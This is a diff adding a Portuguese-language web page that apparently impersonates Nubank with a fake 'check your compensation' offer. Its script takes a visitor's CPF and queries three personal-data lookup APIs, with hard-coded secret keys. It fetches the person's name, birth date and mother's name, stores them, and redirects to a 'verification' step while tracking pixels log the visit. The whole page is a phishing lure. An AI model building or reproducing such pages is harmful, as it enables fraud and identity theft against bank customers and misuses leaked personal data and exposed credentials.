@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Consulte sua Indenização</title>
+  <link rel="icon" href="images/favicon.ico" type="image/x-icon" sizes="256x256">
+  <link rel="preload" href="fonts/a34f9d1faa5f3315-s.p.woff2" as="font" crossorigin="" type="font/woff2">
+  <link rel="preload" href="fonts/6d93bde91c0c2823-s.woff2" as="font" crossorigin="" type="font/woff2">
+  <link rel="preload" href="fonts/581909926a08bbc8-s.woff2" as="font" crossorigin="" type="font/woff2">
+  <link rel="preload" href="fonts/55c55f0601d81cf3-s.woff2" as="font" crossorigin="" type="font/woff2">
+  <script src="https://cdn.tailwindcss.com/"></script>
+  <script type="text/javascript">
+    (function (c, l, a, r, i, t, y) {
+      c[a] = c[a] || function () { (c[a].q = c[a].q || []).push(arguments) };
+      t = l.createElement(r); t.async = 1; t.src = "https://www.clarity.ms/tag/" + i;
+      y = l.getElementsByTagName(r)[0]; y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "rbelpph67g");
+  </script>
+  <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck data-utmify-prevent-subids
+    async defer></script>
+  <script>
+    window.pixelId = "673cd18ac1a87f0eeb7b11d4";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+
+  <style>
+    @font-face {
+      font-family: 'Inter';
+      src: url('fonts/a34f9d1faa5f3315-s.p.woff2') format('woff2');
+      font-weight: 400;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'Inter';
+      src: url('fonts/6d93bde91c0c2823-s.woff2') format('woff2');
+      font-weight: 500;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'Inter';
+      src: url('fonts/581909926a08bbc8-s.woff2') format('woff2');
+      font-weight: 600;
+      font-style: normal;
+    }
+
+    @font-face {
+      font-family: 'Inter';
+      src: url('fonts/55c55f0601d81cf3-s.woff2') format('woff2');
+      font-weight: 700;
+      font-style: normal;
+    }
+
+    body {
+      font-family: 'Inter', sans-serif;
+    }
+
+    .btn-disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+  </style>
+  <script>
+    /* ---------- UTILITÁRIOS ---------- */
+    const formatCPFMask = v => v
+      .replace(/\D/g, '')
+      .replace(/^(\d{3})(\d)/, '$1.$2')
+      .replace(/^(\d{3})\.(\d{3})(\d)/, '$1.$2.$3')
+      .replace(/\.(\d{3})(\d)/, '.$1-$2');
+    const byUpper = s => (s || '').toUpperCase();
+
+    async function handleFormSubmit(e) {
+      e.preventDefault();
+      const cpfInput = document.getElementById('cpf');
+      const cpfValue = cpfInput.value.replace(/\D/g, '');
+      if (cpfValue.length !== 11) {
+        alert('Por favor, digite um CPF válido com 11 dígitos');
+        return;
+      }
+
+      const btn = document.querySelector('button[type="submit"]');
+      btn.textContent = 'Verificando…';
+      btn.disabled = true;
+      btn.classList.add('btn-disabled');
+
+      let body = {};
+
+      // 1) API principal
+      try {
+        const resp1 = await fetch(
+          `https://api-dh.ciphers.systems/api/v1/basic/cpf/?cpf=${cpfValue}`,
+          {
+            method: 'GET',
+            headers: {
+              'x-api-key': 'd1e6811d9cf2f6942af1d6d27254ef3c95242323dd5e2684bd',
+              'Content-Type': 'application/json'
+            }
+          }
+        );
+        console.log('Principal status:', resp1.status);
+        const json1 = await resp1.json();
+        console.log('Principal JSON:', json1);
+        body = json1.data?.body ?? json1.body ?? {};
+        console.log('Principal parsed body:', body);
+        if (!body.name && !body.nome) throw new Error('Sem nome na principal');
+      } catch (err1) {
+        console.warn('Principal falhou, tentando segunda API:', err1);
+
+        // 2) API secundária (apela.tech)
+        try {
+          const resp2 = await fetch(
+            `https://apela.tech/?user=2054e0d4-1301-480d-9aa0-55ca35ed9f08&cpf=${cpfValue}`
+          );
+          console.log('Segunda API status:', resp2.status);
+          const json2 = await resp2.json();
+          console.log('Segunda API JSON:', json2);
+
+          // detecta se veio em data ou diretamente
+          if (json2.data && json2.data.nome) {
+            body = json2.data;
+          } else if (json2.nome) {
+            body = json2;
+          } else {
+            throw new Error('Sem nome na segunda API');
+          }
+          console.log('Segunda API parsed body:', body);
+        } catch (err2) {
+          console.warn('Segunda API falhou, tentando reserva:', err2);
+
+          // 3) API reserva (api.mytrust.space)
+          const resp3 = await fetch(
+            `https://api.mytrust.space/v1/cpf/${cpfValue}`,
+            {
+              method: 'GET',
+              headers: {
+                'x-trust-key': 'sk_01jte1v6kwchhbs92dgfewx38h01jte1v6kw5w3xxv0vt7per4vb',
+                'Content-Type': 'application/json'
+              }
+            }
+          );
+          console.log('Reserva status:', resp3.status);
+          const json3 = await resp3.json();
+          console.log('Reserva JSON:', json3);
+          body = json3.data?.DADOS_PESSOAIS ?? {};
+          console.log('Reserva parsed DADOS_PESSOAIS:', body);
+        }
+      }
+
+      // 4) Mapeia campos finais
+      const nome = (body.name || body.nome || body.NOME || '').trim();
+      const cpf = body.cpf || body.CPF || cpfValue;
+      const birth = (body.birth || body.DATA_NASCIMENTO || body.nascimento || '').replace(/\r+$/, '');
+      const nomeMae = byUpper(body.mother || body.mae || body.NOME_MAE || body.mae || '');
+
+      console.log('Campos finais →', { nome, cpf, birth, nomeMae });
+
+      if (!nome) {
+        alert('Não foi possível obter seus dados, tente novamente mais tarde.');
+        btn.textContent = 'Verificar minha conta';
+        btn.disabled = false;
+        btn.classList.remove('btn-disabled');
+        return;
+      }
+
+      // 5) Salva e redireciona
+      localStorage.setItem('userData', JSON.stringify({
+        nome,
+        cpf,
+        dataNascimento: birth,
+        nomeMae
+      }));
+
+      const cur = new URL(location.href);
+      const nxt = new URL('verification', location.origin);
+      nxt.searchParams.set('cpf', cpfValue);
+      cur.searchParams.forEach((v, k) => nxt.searchParams.set(k, v));
+      window.location.href = nxt;
+    }
+
+    /* ---------- INIT ---------- */
+    document.addEventListener('DOMContentLoaded', () => {
+      const cpfInput = document.getElementById('cpf');
+      cpfInput.addEventListener('input', () => {
+        cpfInput.value = formatCPFMask(cpfInput.value);
+      });
+      document.querySelector('form').addEventListener('submit', handleFormSubmit);
+    });
+  </script>
+
+
+
+
+</head>
+
+<body class="bg-[#831BD1] min-h-screen flex items-center justify-center">
+  <div class="w-[382px] h-[462px] bg-white shadow-sm rounded-xl p-6 flex flex-col">
+    <div class="flex flex-col items-center mb-6">
+      <div class="text-[#831BD1] text-4xl font-bold mb-4">
+        <img alt="Logo" width="64" height="64" class="size-16" src="images/nu.svg">
+      </div>
+      <h1 class="text-xl font-semibold text-[#09090b]">Consulte sua Indenização</h1>
+    </div>
+
+    <form class="space-y-6 flex-1 flex flex-col">
+      <div>
+        <label for="cpf" class="block text-sm font-bold text-gray-500">CPF</label>
+        <input type="text"
+          class="w-full p-1 text-base border-0 border-b-2 border-b-gray-300 rounded-none focus:ring-0 focus:border-b-[#831BD1] focus:outline-none transition-colors duration-200"
+          id="cpf" placeholder="" maxlength="14">
+        <p class="text-xs text-gray-500 mt-1">Use o CPF que utilizou ao criar sua conta.</p>
+      </div>
+
+      <button
+        class="w-full bg-[#831BD1] hover:bg-[#831BD1]/90 text-white py-4 rounded-md text-sm font-medium flex items-center justify-center mt-auto"
+        type="submit">
+        Verificar minha conta
+      </button>
+    </form>
+  </div>
+
+</body>
+
+</html>
